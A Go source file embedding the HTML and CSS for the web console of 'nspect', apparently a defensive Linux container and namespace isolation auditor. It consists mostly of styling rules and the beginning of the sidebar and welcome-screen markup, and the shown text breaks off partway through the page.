package server

// DashboardHTML is the HTML and CSS and JS source for the nspect web console.
const DashboardHTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>nspect - Linux Container & Sandbox Auditor</title>
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Outfit:wght@300;400;500;600;700;800&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- html2pdf.js for client-side PDF export -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>

    <style>
        :root {
            --bg-main: #060814;
            --bg-sidebar: #0b0f19;
            --bg-card: rgba(17, 24, 39, 0.7);
            --bg-card-hover: rgba(31, 41, 55, 0.8);
            --border-color: rgba(255, 255, 255, 0.08);
            --border-glow: rgba(59, 130, 246, 0.15);
            
            --text-primary: #f3f4f6;
            --text-secondary: #9ca3af;
            --text-muted: #6b7280;
            
            --color-primary: #3b82f6;
            --color-primary-glow: rgba(59, 130, 246, 0.2);
            --color-success: #10b981;
            --color-success-glow: rgba(16, 185, 129, 0.15);
            --color-warning: #f59e0b;
            --color-warning-glow: rgba(245, 158, 11, 0.15);
            --color-danger: #ef4444;
            --color-danger-glow: rgba(239, 68, 68, 0.15);
            --color-info: #06b6d4;
            
            --font-display: 'Outfit', 'Inter', sans-serif;
            --font-body: 'Inter', sans-serif;
            --font-mono: 'Fira Code', monospace;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: var(--font-body);
            background-color: var(--bg-main);
            color: var(--text-primary);
            display: flex;
            height: 100vh;
            overflow: hidden;
            background-image: 
                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.08) 0px, transparent 50%),
                radial-gradient(at 100% 100%, rgba(6, 182, 212, 0.05) 0px, transparent 50%);
        }

        /* Sidebar Container */
        .sidebar {
            width: 340px;
            background-color: var(--bg-sidebar);
            border-right: 1px solid var(--border-color);
            display: flex;
            flex-direction: column;
            flex-shrink: 0;
        }

        .sidebar-header {
            padding: 1.75rem 1.5rem;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .logo-area {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .logo-icon {
            width: 32px;
            height: 32px;
            background: linear-gradient(135deg, #3b82f6, #06b6d4);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 15px rgba(59, 130, 246, 0.4);
        }

        .logo-icon svg {
            width: 18px;
            height: 18px;
            fill: #fff;
        }

        .logo-text {
            font-family: var(--font-display);
            font-weight: 800;
            font-size: 1.4rem;
            letter-spacing: -0.025em;
            background: linear-gradient(135deg, #fff, #9ca3af);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .web-badge {
            font-size: 0.65rem;
            font-weight: 700;
            background-color: rgba(59, 130, 246, 0.15);
            color: #60a5fa;
            border: 1px solid rgba(59, 130, 246, 0.3);
            padding: 0.15rem 0.4rem;
            border-radius: 4px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }

        .btn-refresh {
            background: transparent;
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
            border-radius: 6px;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-refresh:hover {
            color: var(--text-primary);
            background-color: var(--bg-card-hover);
            border-color: var(--color-primary);
            box-shadow: 0 0 8px rgba(59, 130, 246, 0.2);
        }

        /* PID Custom Input */
        .pid-input-container {
            padding: 1.25rem 1.5rem;
            border-bottom: 1px solid var(--border-color);
            background-color: rgba(255, 255, 255, 0.01);
        }

        .pid-form {
            display: flex;
            gap: 0.5rem;
        }

        .input-pid {
            flex-grow: 1;
            background-color: rgba(0, 0, 0, 0.4);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: #fff;
            padding: 0.5rem 0.75rem;
            font-family: var(--font-mono);
            font-size: 0.85rem;
            outline: none;
            transition: all 0.2s;
        }

        .input-pid:focus {
            border-color: var(--color-primary);
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.15);
        }

        .btn-audit {
            background-color: var(--color-primary);
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 0.5rem 1rem;
            font-family: var(--font-display);
            font-weight: 600;
            font-size: 0.85rem;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-audit:hover {
            background-color: #2563eb;
            box-shadow: 0 0 12px rgba(59, 130, 246, 0.35);
        }

        /* Container Process List */
        .process-list-container {
            flex-grow: 1;
            overflow-y: auto;
            padding: 1rem 1.5rem;
        }

        .list-title {
            font-size: 0.75rem;
            font-weight: 700;
            text-transform: uppercase;
            color: var(--text-muted);
            letter-spacing: 0.08em;
            margin-bottom: 0.75rem;
        }

        .process-list {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
            list-style: none;
        }

        .process-item {
            background-color: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 0.75rem 1rem;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            flex-direction: column;
            gap: 0.25rem;
        }

        .process-item:hover {
            background-color: var(--bg-card-hover);
            border-color: var(--color-primary);
            transform: translateX(4px);
        }

        .process-item.active {
            background-color: rgba(59, 130, 246, 0.1);
            border-color: var(--color-primary);
            box-shadow: 0 0 10px rgba(59, 130, 246, 0.15);
        }

        .process-item-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .process-name {
            font-weight: 600;
            font-size: 0.95rem;
            color: #fff;
            max-width: 180px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .process-pid {
            font-family: var(--font-mono);
            font-size: 0.75rem;
            background-color: rgba(255, 255, 255, 0.05);
            padding: 0.1rem 0.3rem;
            border-radius: 4px;
            color: var(--text-secondary);
        }

        .process-cmdline {
            font-size: 0.75rem;
            color: var(--text-muted);
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .process-ns {
            font-size: 0.7rem;
            color: var(--text-secondary);
            display: flex;
            align-items: center;
            gap: 0.25rem;
            margin-top: 0.25rem;
        }

        .process-ns svg {
            width: 10px;
            height: 10px;
            fill: var(--text-muted);
        }

        .empty-list-msg {
            color: var(--text-muted);
            font-size: 0.85rem;
            text-align: center;
            padding: 2rem 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.75rem;
        }

        .empty-list-msg svg {
            width: 32px;
            height: 32px;
            fill: var(--text-muted);
            opacity: 0.5;
        }

        /* Main Console Panel */
        .main-panel {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            overflow-y: auto;
            height: 100%;
            position: relative;
        }

        /* Welcome/Placeholder State */
        .welcome-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            padding: 3rem;
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
        }

        .welcome-shield {
            width: 90px;
            height: 90px;
            background: radial-gradient(circle, rgba(59, 130, 246, 0.2) 0%, transparent 70%);
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            margin-bottom: 2rem;
            border: 1px dashed rgba(59, 130, 246, 0.3);
            animation: pulse-dashed 3s infinite linear;
        }

        @keyframes pulse-dashed {
            0% { transform: rotate(0deg) scale(1); }
            50% { transform: rotate(180deg) scale(1.05); }
            100% { transform: rotate(360deg) scale(1); }
        }

        .welcome-shield svg {
            width: 44px;
            height: 44px;
            fill: var(--color-primary);
            filter: drop-shadow(0 0 10px rgba(59, 130, 246, 0.5));
        }

        .welcome-title {
            font-family: var(--font-display);
            font-size: 2.2rem;
            font-weight: 800;
            letter-spacing: -0.02em;
            margin-bottom: 1rem;
            background: linear-gradient(135deg, #fff, #9ca3af);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .welcome-desc {
            color: var(--text-secondary);
            font-size: 1rem;
            max-width: 600px;
            line-height: 1.6;
            margin-bottom: 2.5rem;
        }

        .welcome-cards {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1.25rem;
            width: 100%;
        }

        .welcome-card {
            background-color: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 1.5rem;
            text-align: left;
            transition: all 0.3s;
        }

        .welcome-card:hover {
            border-color: var(--color-primary);
            box-shadow: 0 4px 20px rgba(59, 130, 246, 0.05);
            transform: translateY(-2px);
        }

        .welcome-card-icon {
            width: 36px;
            height: 36px;
            background-color: rgba(59, 130, 246, 0.1);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 1rem;
        }

        .welcome-card-icon svg {
            width: 20px;
            height: 20px;
            fill: var(--color-primary);
        }

        .welcome-card-title {
            font-size: 1.05rem;
            font-weight: 600;
            color: #fff;
            margin-bottom: 0.5rem;
        }

        .welcome-card-desc {
            color: var(--text-secondary);
            font-size: 0.85rem;
            line-height: 1.5;
        }

        /* Loading Spinner */
        .loading-container {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            padding: 3rem;
        }

        .scanning-loader {
            position: relative;
            width: 120px;
            height: 120px;
            margin-bottom: 2rem;
        }

        .scanning-loader-ring {
            box-sizing: border-box;
            display: block;
            position: absolute;
            width: 100px;
            height: 100px;
            margin: 10px;
            border: 4px solid var(--color-primary);
            border-radius: 50%;
            animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
            border-color: var(--color-primary) transparent transparent transparent;
        }

        .scanning-loader-ring:nth-child(1) { animation-delay: -0.45s; }
        .scanning-loader-ring:nth-child(2) { animation-delay: -0.3s; }
        .scanning-loader-ring:nth-child(3) { animation-delay: -0.15s; }

        @keyframes lds-ring {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .scanning-shield {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .scanning-shield svg {
            width: 28px;
            height: 28px;
            fill: var(--color-primary);
            animation: pulse-glow 1.5s infinite alternate;
        }

        @keyframes pulse-glow {
            0% { filter: drop-shadow(0 0 2px rgba(59, 130, 246, 0.4)); opacity: 0.7; }
            100% { filter: drop-shadow(0 0 12px rgba(59, 130, 246, 0.8)); opacity: 1; }
        }

        .loading-title {
            font-family: var(--font-display);
            font-size: 1.4rem;
            font-weight: 700;
            color: #fff;
            margin-bottom: 0.5rem;
        }

        .loading-subtitle {
            color: var(--text-secondary);
            font-size: 0.9rem;
            animation: blink 1.5s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 1; }
        }

        /* Error Container */
        .error-container {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            padding: 3rem;
            text-align: center;
        }

        .error-icon {
            width: 64px;
            height: 64px;
            background-color: var(--color-danger-glow);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 1.5rem;
        }

        .error-icon svg {
            width: 32px;
            height: 32px;
            fill: var(--color-danger);
        }

        .error-title {
            font-family: var(--font-display);
            font-size: 1.5rem;
            font-weight: 700;
            color: #fff;
            margin-bottom: 0.5rem;
        }

        .error-desc {
            color: var(--text-secondary);
            font-size: 0.95rem;
            max-width: 500px;
            margin-bottom: 1.5rem;
        }

        /* Active Report Layout */
        .report-wrapper {
            display: none; /* Populated dynamically */
            flex-direction: column;
            width: 100%;
            height: 100%;
        }

        /* Report Header */
        .report-header {
            padding: 1.5rem 2rem;
            border-bottom: 1px solid var(--border-color);
            background-color: rgba(11, 15, 25, 0.5);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
        }

        .report-meta-info {
            display: flex;
            flex-direction: column;
            gap: 0.25rem;
        }

        .report-pid-row {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .report-target-title {
            font-family: var(--font-display);
            font-size: 1.6rem;
            font-weight: 800;
            color: #fff;
            letter-spacing: -0.01em;
        }

        .report-pid-badge {
            font-family: var(--font-mono);
            font-size: 0.8rem;
            background-color: var(--color-primary-glow);
            color: #60a5fa;
            border: 1px solid rgba(59, 130, 246, 0.3);
            padding: 0.15rem 0.5rem;
            border-radius: 4px;
            font-weight: 600;
        }

        .report-cmdline-wrapper {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .report-cmdline-label {
            font-size: 0.75rem;
            font-weight: 700;
            color: var(--text-muted);
            text-transform: uppercase;
        }

        .report-cmdline {
            font-family: var(--font-mono);
            font-size: 0.75rem;
            color: var(--text-secondary);
            background-color: rgba(0, 0, 0, 0.3);
            padding: 0.15rem 0.5rem;
            border-radius: 4px;
            max-width: 480px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            border: 1px solid var(--border-color);
        }

        .report-actions {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .btn-export {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            background-color: var(--bg-card);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            border-radius: 6px;
            padding: 0.5rem 0.85rem;
            font-family: var(--font-display);
            font-weight: 600;
            font-size: 0.85rem;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-export:hover {
            border-color: var(--color-primary);
            background-color: var(--bg-card-hover);
        }

        .btn-export svg {
            width: 15px;
            height: 15px;
            fill: var(--text-secondary);
        }

        .btn-export.primary {
            background-color: var(--color-primary);
            border: none;
            color: #fff;
        }

        .btn-export.primary:hover {
            background-color: #2563eb;
            box-shadow: 0 0 10px rgba(59, 130, 246, 0.3);
        }

        .btn-export.primary svg {
            fill: #fff;
        }

        /* Report Scroll Area */
        .report-scroll-content {
            flex-grow: 1;
            overflow-y: auto;
            padding: 2rem;
            display: flex;
            flex-direction: column;
            gap: 2rem;
        }

        /* Score & Overview Row */
        .report-row-top {
            display: grid;
            grid-template-columns: 280px 1fr;
            gap: 2rem;
        }

        @media (max-width: 1024px) {
            .report-row-top {
                grid-template-columns: 1fr;
            }
        }

        .score-card {
            background-color: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 2rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            box-shadow: inset 0 0 20px rgba(255, 255, 255, 0.01);
        }

        .score-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, var(--border-glow) 0%, transparent 60%);
            pointer-events: none;
        }

        /* Circular Score Indicator */
        .score-gauge {
            position: relative;
            width: 140px;
            height: 140px;
            margin-bottom: 1.5rem;
        }

        .score-gauge svg {
            transform: rotate(-90deg);
            width: 100%;
            height: 100%;
        }

        .score-gauge circle {
            fill: none;
            stroke-width: 10;
        }

        .score-gauge .track {
            stroke: rgba(255, 255, 255, 0.04);
        }

        .score-gauge .fill {
            stroke-dasharray: 408;
            stroke-dashoffset: 408; /* Animate dynamically */
            stroke-linecap: round;
            transition: stroke-dashoffset 1s ease-in-out;
        }

        .score-value {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .score-number {
            font-family: var(--font-display);
            font-size: 2.2rem;
            font-weight: 800;
            color: #fff;
            line-height: 1;
        }

        .score-max {
            font-size: 0.75rem;
            color: var(--text-muted);
            margin-top: 0.1rem;
        }

        .score-label {
            font-family: var(--font-display);
            font-weight: 700;
            font-size: 1.1rem;
            margin-bottom: 0.25rem;
        }

        .score-status {
            font-size: 0.75rem;
            text-transform: uppercase;
            font-weight: 700;
            letter-spacing: 0.05em;
            padding: 0.15rem 0.5rem;
            border-radius: 9999px;
        }

        /* Score Status Colors */
        .score-gauge.high .fill { stroke: var(--color-success); filter: drop-shadow(0 0 6px rgba(16, 185, 129, 0.4)); }
        .score-gauge.medium .fill { stroke: var(--color-warning); filter: drop-shadow(0 0 6px rgba(245, 158, 11, 0.4)); }
        .score-gauge.low .fill { stroke: var(--color-danger); filter: drop-shadow(0 0 6px rgba(239, 68, 68, 0.4)); }

        .score-status.high { background-color: var(--color-success-glow); color: var(--color-success); border: 1px solid rgba(16, 185, 129, 0.3); }
        .score-status.medium { background-color: var(--color-warning-glow); color: var(--color-warning); border: 1px solid rgba(245, 158, 11, 0.3); }
        .score-status.low { background-color: var(--color-danger-glow); color: var(--color-danger); border: 1px solid rgba(239, 68, 68, 0.3); }

        /* Metrics summary widgets */
        .summary-dashboard {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 1rem;
        }

        .metric-widget {
            background-color: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 1.25rem;
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
            transition: all 0.2s;
        }

        .metric-widget:hover {
            border-color: rgba(255, 255, 255, 0.12);
            background-color: rgba(17, 24, 39, 0.85);
        }

        .metric-label-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .metric-label {
            font-size: 0.8rem;
            color: var(--text-secondary);
            font-weight: 500;
        }

        .metric-icon {
            width: 24px;
            height: 24px;
            background-color: rgba(255, 255, 255, 0.03);
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .metric-icon svg {
            width: 14px;
            height: 14px;
            fill: var(--text-secondary);
        }

        .metric-value-row {
            display: flex;
            align-items: baseline;
            gap: 0.5rem;
        }

        .metric-value {
            font-family: var(--font-display);
            font-size: 1.75rem;
            font-weight: 700;
            color: #fff;
        }

        .metric-status {
            font-size: 0.75rem;
            font-weight: 600;
            border-radius: 4px;
            padding: 0.05rem 0.35rem;
        }

        .metric-status.danger { background-color: var(--color-danger-glow); color: var(--color-danger); }
        .metric-status.warning { background-color: var(--color-warning-glow); color: var(--color-warning); }
        .metric-status.success { background-color: var(--color-success-glow); color: var(--color-success); }
        .metric-status.neutral { background-color: rgba(255, 255, 255, 0.05); color: var(--text-secondary); }

        /* Report Tabs Interface */
        .tabs-header {
            display: flex;
            border-bottom: 1px solid var(--border-color);
            gap: 0.5rem;
            overflow-x: auto;
            flex-shrink: 0;
            scrollbar-width: none; /* Hide scrollbar for Firefox */
        }

        .tabs-header::-webkit-scrollbar {
            display: none; /* Hide scrollbar for Chrome/Safari */
        }

        .tab-btn {
            background: transparent;
            border: none;
            border-bottom: 2px solid transparent;
            color: var(--text-secondary);
            font-family: var(--font-display);
            font-weight: 600;
            font-size: 0.9rem;
            padding: 0.75rem 1.25rem;
            cursor: pointer;
            transition: all 0.2s;
            white-space: nowrap;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .tab-btn svg {
            width: 16px;
            height: 16px;
            fill: var(--text-secondary);
            transition: fill 0.2s;
        }

        .tab-btn:hover {
            color: #fff;
        }

        .tab-btn.active {
            color: var(--color-primary);
            border-bottom-color: var(--color-primary);
        }

        .tab-btn.active svg {
            fill: var(--color-primary);
        }

        /* Tab Content Panel */
        .tab-panel-container {
            flex-grow: 1;
        }

        .tab-content {
            display: none;
            animation: fadeIn 0.3s ease-in-out;
        }

        .tab-content.active {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(5px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Common Styling inside Tabs */
        .section-card {
            background-color: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
        }

        .section-card-title {
            font-family: var(--font-display);
            font-size: 1.15rem;
            font-weight: 700;
            margin-bottom: 1.25rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 0.75rem;
            color: #fff;
        }

        .section-card-title-text {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .section-card-title svg {
            width: 18px;
            height: 18px;
            fill: var(--color-primary);
        }

        /* Tables styling */
        .data-table-wrapper {
            overflow-x: auto;
            width: 100%;
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }

        .data-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.85rem;
            text-align: left;
        }

        .data-table th, .data-table td {
            padding: 0.75rem 1rem;
            border-bottom: 1px solid var(--border-color);
        }

        .data-table th {
            background-color: rgba(255, 255, 255, 0.02);
            color: var(--text-secondary);
            font-weight: 600;
            font-family: var(--font-display);
        }

        .data-table tr:last-child td {
            border-bottom: none;
        }

        .data-table tr:hover td {
            background-color: rgba(255, 255, 255, 0.01);
        }

        /* Risk Badges */
        .risk-badge {
            font-size: 0.7rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            padding: 0.15rem 0.45rem;
            border-radius: 4px;
            display: inline-block;
        }

        .risk-badge.critical { background-color: var(--color-danger-glow); color: var(--color-danger); border: 1px solid rgba(239, 68, 68, 0.3); }
        .risk-badge.high { background-color: rgba(249, 115, 22, 0.15); color: #f97316; border: 1px solid rgba(249, 115, 22, 0.3); }
        .risk-badge.medium { background-color: var(--color-warning-glow); color: var(--color-warning); border: 1px solid rgba(245, 158, 11, 0.3); }
        .risk-badge.low { background-color: var(--color-primary-glow); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.3); }
        .risk-badge.info { background-color: var(--color-success-glow); color: var(--color-success); border: 1px solid rgba(16, 185, 129, 0.3); }

        /* Namespaces grid list */
        .namespaces-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 1rem;
        }

        .ns-card {
            background-color: rgba(255, 255, 255, 0.01);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 1.25rem;
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
            transition: all 0.2s;
        }

        .ns-card.shared {
            border-left: 3px solid var(--color-danger);
            background-color: rgba(239, 68, 68, 0.02);
        }

        .ns-card.isolated {
            border-left: 3px solid var(--color-success);
            background-color: rgba(16, 185, 129, 0.02);
        }

        .ns-card-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .ns-card-name {
            font-family: var(--font-display);
            font-weight: 700;
            font-size: 1rem;
            text-transform: uppercase;
            color: #fff;
        }

        .ns-inode-row {
            display: flex;
            justify-content: space-between;
            font-size: 0.75rem;
            color: var(--text-secondary);
        }

        .ns-inode-val {
            font-family: var(--font-mono);
        }

        .ns-card-desc {
            font-size: 0.8rem;
            color: var(--text-secondary);
            line-height: 1.4;
        }

        /* Recommendations Checklist */
        .recs-container {
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
        }

        .rec-item {
            background-color: rgba(255, 255, 255, 0.01);
            border: 1px solid var(--border-color);
            border-left: 4px solid var(--color-primary);
            border-radius: 8px;
            padding: 1rem 1.25rem;
            display: flex;
            gap: 1rem;
            align-items: flex-start;
        }

        .rec-item.critical-rec {
            border-left-color: var(--color-danger);
        }

        .rec-checkbox {
            margin-top: 0.2rem;
            width: 16px;
            height: 16px;
            accent-color: var(--color-primary);
            cursor: pointer;
        }

        .rec-details {
            display: flex;
            flex-direction: column;
            gap: 0.25rem;
        }

        .rec-title {
            font-weight: 600;
            font-size: 0.9rem;
            color: #fff;
        }

        .rec-text {
            font-size: 0.85rem;
            color: var(--text-secondary);
            line-height: 1.5;
        }

        /* Capabilities tab designs */
        .caps-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1.5rem;
        }

        @media (max-width: 900px) {
            .caps-grid {
                grid-template-columns: 1fr;
            }
        }

        .cap-set-card {
            background-color: rgba(255, 255, 255, 0.01);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 1.25rem;
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
        }

        .cap-set-title {
            font-family: var(--font-display);
            font-size: 0.95rem;
            font-weight: 700;
            color: #fff;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 0.5rem;
        }

        .cap-list-tags {
            display: flex;
            flex-wrap: wrap;
            gap: 0.4rem;
            max-height: 200px;
            overflow-y: auto;
            padding: 0.25rem 0;
        }

        .cap-tag {
            font-family: var(--font-mono);
            font-size: 0.7rem;
            background-color: rgba(255, 255, 255, 0.05);
            color: var(--text-secondary);
            padding: 0.15rem 0.4rem;
            border-radius: 4px;
            border: 1px solid rgba(255, 255, 255, 0.02);
        }

        .cap-tag.high-risk-tag {
            background-color: var(--color-danger-glow);
            color: #f87171;
            border-color: rgba(239, 68, 68, 0.2);
        }

        /* Mount Risks layout */
        .mount-risks-grid {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        .mount-risk-card {
            background-color: rgba(255, 255, 255, 0.01);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 1.25rem;
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
        }

        .mount-risk-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .mount-risk-path {
            font-family: var(--font-mono);
            font-size: 0.9rem;
            color: #fff;
            font-weight: 600;
        }

        .mount-risk-meta-row {
            display: flex;
            gap: 1.5rem;
            font-size: 0.75rem;
            color: var(--text-secondary);
        }

        .mount-risk-meta-item span:first-child {
            color: var(--text-muted);
            margin-right: 0.25rem;
        }

        .mount-risk-meta-item span:last-child {
            font-family: var(--font-mono);
        }

        /* Secrets scanning */
        .secret-value-box {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .secret-mask-btn {
            background: transparent;
            border: none;
            color: var(--color-primary);
            cursor: pointer;
            font-size: 0.75rem;
            font-weight: 600;
            padding: 0.1rem 0.25rem;
        }

        .secret-mask-btn:hover {
            text-decoration: underline;
        }

        .secret-value-text {
            font-family: var(--font-mono);
            font-size: 0.8rem;
        }

        /* PDF print container overrides (hidden in browser, used by html2pdf) */
        #pdf-template-container {
            display: none;
        }

        /* Custom Scrollbars */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.2);
        }

        ::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: rgba(255, 255, 255, 0.2);
        }

        /* Print Media Styles */
        @media print {
            body {
                background: #fff !important;
                color: #000 !important;
                font-size: 10pt !important;
            }
            .sidebar, .report-actions, .tabs-header {
                display: none !important;
            }
            .main-panel {
                width: 100% !important;
                overflow: visible !important;
            }
            .tab-content {
                display: block !important;
                page-break-after: always;
            }
        }
    </style>
</head>
<body>

    <!-- SIDEBAR: LIST OF CONTAINERS -->
    <div class="sidebar">
        <div class="sidebar-header">
            <div class="logo-area">
                <div class="logo-icon">
                    <svg viewBox="0 0 24 24">
                        <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,5A3,3 0 0,1 15,8A3,3 0 0,1 12,11A3,3 0 0,1 9,8A3,3 0 0,1 12,5M12,13C14.67,13 20,14.33 20,17V18H4V17C4,14.33 9.33,13 12,13Z" />
                    </svg>
                </div>
                <div class="logo-text">nspect</div>
                <span class="web-badge">Console</span>
            </div>
            <button class="btn-refresh" id="refresh-btn" title="Refresh list">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M17.65,6.35C16.2,4.9 14.21,4 12,4A8,8 0 0,0 4,12A8,8 0 0,0 12,20C15.73,20 18.84,17.45 19.73,14H17.65C16.83,16.33 14.61,18 12,18A6,6 0 0,1 6,12A6,6 0 0,1 12,6C13.66,6 15.14,6.69 16.22,7.78L13,11H21V3L17.65,6.35Z" />
                </svg>
            </button>
        </div>

        <div class="pid-input-container">
            <form class="pid-form" id="pid-form">
                <input type="number" class="input-pid" id="pid-input" placeholder="Enter target PID..." required min="1">
                <button type="submit" class="btn-audit">Audit</button>
            </form>
        </div>

        <div class="process-list-container">
            <h3 class="list-title">Isolated Processes</h3>
            <ul class="process-list" id="process-list">
                <!-- Populated dynamically -->
            </ul>
        </div>
    </div>

    <!-- MAIN PANEL: AUDIT CONSOLE -->
    <div class="main-panel">
        
        <!-- Welcome Screen -->
        <div class="welcome-container" id="welcome-screen">
            <div class="welcome-shield">
                <svg viewBox="0 0 24 24">
                    <path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M12,6A6,6 0 0,0 6,12A6,6 0 0,0 12,18A6,6 0 0,0 18,12A6,6 0 0,0 12,6M12,8A4,4 0 0,1 16,12A4,4 0 0,1 12,16A4,4 0 0,1 8,12A4,4 0 0,1 12,8Z" />
                </svg>
            </div>
            <h1 class="welcome-title">Linux Container & Namespace Auditor</h1>
            <p class="welcome-desc">
                nspect assesses process isolation and Linux hardening mechanisms inside namespaces. It audits capabilities, mount visibility, LSM settings, open file descriptors, network configurations, and filesystem permissions to identify container escapes and risk exposures.
            </p>
            <div class="welcome-cards">
                <div class="welcome-card">
                    <div class="welcome-card-icon">
                        <svg viewBox="0 0 24 24">
